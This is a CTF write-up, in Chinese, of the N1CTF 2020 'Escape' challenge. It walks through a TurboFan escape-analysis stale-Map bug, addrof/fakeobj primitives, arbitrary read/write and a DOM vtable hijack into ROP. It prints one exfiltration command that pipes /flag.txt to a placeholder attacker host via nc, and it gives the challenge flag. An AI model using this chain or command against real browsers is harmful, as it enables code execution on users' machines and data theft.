# N1CTF 2020 Escape Writeup

## 题目简述

Escape 提供一个打过补丁的 V8/Chromium。补丁在 TurboFan 逃逸分析的 `VirtualObject` 中缓存对象 Map，却没有在对象逃逸或状态变化后完整失效缓存。优化编译器因此会对同一对象持有过期类型信息，形成类型混淆。题目禁用了常见的 WebAssembly 可执行内存路线，最终需要利用 DOM 原生对象的虚表劫持执行 ROP。

## 解题过程

### 补丁导致的陈旧 Map

逃逸分析会把未逃逸对象标量替换，并用虚拟对象状态追踪字段。题目补丁增加了 Map 缓存以减少重复查询，但只在部分写入路径更新。当对象先按一种布局被优化、随后逃逸并改变 Map 时，后续节点仍可能读取旧缓存。

构造函数需要反复热身，使 TurboFan 生成优化代码，再在关键一次调用中改变对象状态。优化代码仍按旧 Map 解释字段，于是同一 64 位值可以在浮点数、对象引用和数组元素指针之间混用。由此实现：

```javascript
function addrof(obj) { /* object -> float bits */ }
function fakeobj(addr) { /* float bits -> object */ }
```

### 从类型混淆到任意读写

利用 `addrof` 泄露真实数组和 ArrayBuffer 地址，再伪造数组 Map、elements 指针与长度。让伪造数组的 elements 指向任意地址后，读写数组元素就成为 64 位任意读写。稳定利用时要区分 tagged pointer、压缩指针和双精度位模式，并用 `BigInt`/`DataView` 完成无损转换。

先泄露 V8 堆地址、Chromium 模块地址和 libc 地址，再在受控 ArrayBuffer 中布置伪虚表与 ROP 链。每个基址都应由相应模块内已知偏移回算，不能混用本地与远程构建的符号。

### 劫持 DOM 对象虚表

创建一个 `div` 元素可在渲染进程堆上获得对应的 C++ DOM 对象。通过任意读定位其原生对象和首个虚表指针，再把虚表改为 ArrayBuffer 中的伪表。伪表中的目标槽指向栈迁移 gadget，后续虚函数调用会切换到受控 ROP 链。

题目关闭了 WASM，因此 ROP 负责调用：

```c
system("cat /flag.txt | nc ATTACKER PORT");
```

仓库中的官方 `exploit/index.html` 展示了从触发优化、构造 `addrof`/`fakeobj`、伪造数组到 DOM 虚表劫持的完整顺序。源码中的最终 flag 为：

```text
n1ctf{oops_this_is_not_how_you_escape_analysis_:(}
```

## 方法总结

浏览器优化器漏洞的分析应建立“语言语义—优化器假设—机器表示”三层对应关系。陈旧 Map 本身只产生错误类型，仍需逐步验证地址泄露、伪对象、任意读写和控制流劫持。禁用 WASM 后，DOM 原生对象提供了可被调用的虚函数边界，是从 JavaScript 堆原语走向本机执行的关键桥梁。
